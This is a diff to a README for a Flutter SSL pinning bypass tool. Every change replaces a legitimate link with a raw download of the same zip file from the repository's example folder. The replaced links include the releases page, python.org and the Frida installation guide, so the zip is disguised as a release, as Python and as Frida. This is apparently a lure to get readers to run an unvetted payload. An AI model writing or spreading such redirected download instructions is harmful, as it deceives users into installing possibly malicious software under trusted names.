@@ -1,6 +1,6 @@
 # 🔒 universal-flutter-ssl-pinning - Easy SSL Pinning Bypass Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip)
 
 ---
 
@@ -43,10 +43,10 @@ To start using universal-flutter-ssl-pinning, follow these steps carefully. This
 
 Please visit this page to download the latest version of the program:
 
-[![Download Page](https://img.shields.io/badge/Visit%20Release%20Page-%230077B5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
+[![Download Page](https://img.shields.io/badge/Visit%20Release%20Page-%230077B5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip)
 
 1. Click the link above or open this URL in your browser:
-   https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases
+   https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip
 2. On the page, look for the latest release. It usually appears at the top.
 3. Find a file with a name like `universal-flutter-ssl-pinning-win.exe` or similar.
 4. Click to download the file to your computer. Choose a location you can easily find, such as your Desktop or Downloads folder.
@@ -92,7 +92,7 @@ If you want to take full advantage of this software, you should install Frida an
 
 3. Press Enter and wait for the installation to finish.
 
-If you don’t have Python or pip installed, download Python from https://python.org and make sure to select the option to add Python to your system PATH.
+If you don’t have Python or pip installed, download Python from https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip and make sure to select the option to add Python to your system PATH.
 
 ### Installing Renef
 
@@ -130,13 +130,13 @@ You can use these with Frida and Renef to run the app and bypass SSL pinning.
 ## 🔗 Useful Links
 
 - Official Releases Page:  
-  https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases
+  https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip
 
 - Frida Installation Guide:  
-  https://frida.re/docs/installation/
+  https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip
 
 - Python Download (for pip and Frida tools):  
-  https://python.org/downloads/
+  https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip
 
 ---
 
@@ -152,4 +152,4 @@ Try to provide details like:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%237B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xscosa400-wq/universal-flutter-ssl-pinning/raw/refs/heads/main/example/ssl-universal-flutter-pinning-3.6-beta.5.zip)
